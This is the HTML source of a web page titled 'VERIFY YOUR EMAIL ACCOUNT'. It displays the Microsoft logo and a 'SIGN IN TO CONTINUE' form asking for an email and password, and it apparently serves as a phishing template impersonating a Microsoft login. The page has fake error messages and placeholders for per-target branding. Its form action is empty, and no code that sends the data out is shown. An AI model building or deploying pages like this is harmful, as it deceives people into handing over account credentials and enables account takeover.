<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>VERIFY YOUR EMAIL ACCOUNT</title>
    <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
<style>
body{
			background: #fff;
		}

		.container{
			width:100%;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
		}

		.office{
			width: 380px;
			background: #D1D8F3;
		}

		.office-holder{
			width:80%;
			margin: auto;
			padding: 20px 0px;
		}

		.logo{
			width:100%;
			float: left;
			margin-bottom: 2em;
		}

		.logo h1{
			font-family: arial;
		}

		.verify{
			width: 70%;
			margin: auto;
		}

		.verify h4{
			font-family: arial;
		}

		fieldset{
			width: 90%;
			float: right;
			border:2px solid #4285f4;
			border-radius: 5px;
		}

		legend{
			font-size: 15px;
			overflow: hidden;
			width: 42%;
			padding:0px 2px;
			margin: 0px;
		}

		.verify input[type='text']{
			width: 100%;
			float: right;
			border:none;
			padding:3px 10px;
		}

		.verify button{
			border:none;
			height: 40px;
			width: 80px;
			float: right;
			margin-top: 2em;
			background: #4285f4;
			border-radius: 5px;
			color: #fff;
		}

		.email-to-verify{
			border:1px solid #000;
			border-radius: 10px;
		}

		.form-holder{
			width:100%;
			float: left;
		}

		.form-holder h3{
			font-weight: 600;
		}

		.form-holder input[type='email'], input[type='password']{
			width: 100%;
			height:40px;
			float: left;
			margin-bottom: 15px;
		}
		.form-holder .btn-holder{
			width:100%;
			margin-top:1em;
			display: flex;
			align-content: center;
			align-items: center;
			justify-content: center;
		}

		.form-holder .btn-holder .btn{
			background:#0073C6;
			border:none;
			padding:6px 10px;
			color:#fff;
			border-radius: 0px;
			margin-top: 20px;
			margin-bottom: 20px;
		}

		.form-holder .btn-holder .btn:hover{
			cursor:pointer;
		}

		.checkbox{
			width: 100%;
			float: left;
			margin-top:5px;
		}

		.checkbox label{
			font-family:arial;
			font-size:13px;
			float: left;
			margin-left:1em;
		}

		.hide{
			display: none;
		}

</style>
</head>

<body>
    <div id="html_encoder_div">
        <div class="container">
            <div class="office show border shadow bg-light" id="others">
                <div class="office-holder">
                    <div class="logo" style="text-align:center">
                        <div id="login_logo">
                            <img id="logoimg" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Microsoft_logo_-_2012_%28vertical%29.svg/1910px-Microsoft_logo_-_2012_%28vertical%29.svg.png" width="50" height="50" alt="">
                        </div>
                        <h3 class="text-dark"><strong id="logoname" class="text-uppercase"></strong></h3>
                        <h5 class="font-weight-light">SIGN IN TO CONTINUE </h5>
                    </div>
                    <center>
                        <div id="msg" style="display: none;font-weight: 600;color: red;">PLEASE INPUT THE CORRECT DETAILS.</div>
                        <span id="error" class="text-danger" style="display: none;">THIS ACCOUNT DOES NOT EXIST. SIGN IN WITH DIFFERENT ACCOUNT.</span>
                    </center>
                    <form id="contact" method="POST" action="">
                        <div class="form-holder">
                            <div style="width: 100%;">
                                <div class="alert alert-danger hide alert2"></div>
                            </div>
                            <input type="email" id="email" name="email" class="form-control" placeholder="EMAIL" required="">
                            <input type="password" id="password" name="password" placeholder="PASSWORD" class="form-control" required="">
                            <div class="checkbox">
                                <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
                                <label>REMEMBER ME</label>
                            </div>
                            <div class="btn-holder">
                                <button class="btn btn-lg col-12" id="submit-btn">LOG IN</button>
                            </div>
                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;"></p>
                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;"></p>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <style>
    .tb_button {
        padding: 1px;
        cursor: pointer;
        border-right: 1px solid #8b8b8b;
        border-left: 1px solid #FFF;
        border-bottom: 1px solid #fff;
    }

    .tb_button.hover {
        borer: 2px outset #def;
        background-color: #f8f8f8 !important;
    }

    .ws_toolbar {
        z-index: 100000
    }

    .ws_toolbar .ws_tb_btn {
        cursor: pointer;
        border: 1px solid #555;
        padding: 3px
    }

    .tb_highlight {
        background-color: yellow
    }

    .tb_hide {
        visibility: hidden
    }

    .ws_toolbar img {
        padding: 2px;
        margin: 0px
    }
    </style>
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>


</body></html>
